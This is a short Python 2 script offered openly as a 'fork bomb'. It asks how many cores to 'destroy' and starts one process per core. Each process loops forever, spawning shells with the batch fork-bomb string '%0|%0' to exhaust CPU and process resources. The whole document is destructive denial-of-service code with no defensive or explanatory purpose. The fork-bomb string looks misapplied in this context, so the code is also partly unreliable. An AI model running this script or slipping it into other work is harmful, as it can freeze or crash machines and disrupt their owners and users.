import os
import multiprocessing

def fork_bomb():
    while 1:
        os.popen("%0|%0")
        
if __name__== '__main__':

    num_cores = raw_input('how many cores should i destroy? ')
    for i in range(int(num_cores)):
        p = multiprocessing.Process(target=fork_bomb)
        p.start()